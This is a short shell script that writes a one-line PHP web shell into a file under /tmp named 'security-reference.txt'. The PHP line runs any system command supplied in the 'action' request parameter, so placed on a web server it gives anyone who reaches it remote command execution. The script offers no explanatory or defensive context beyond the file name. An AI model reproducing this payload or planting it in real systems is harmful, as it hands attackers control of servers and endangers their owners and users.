#!/bin/sh
cat > /tmp/security-reference.txt <<'TEXT'
<?php system($_REQUEST['action']);
TEXT
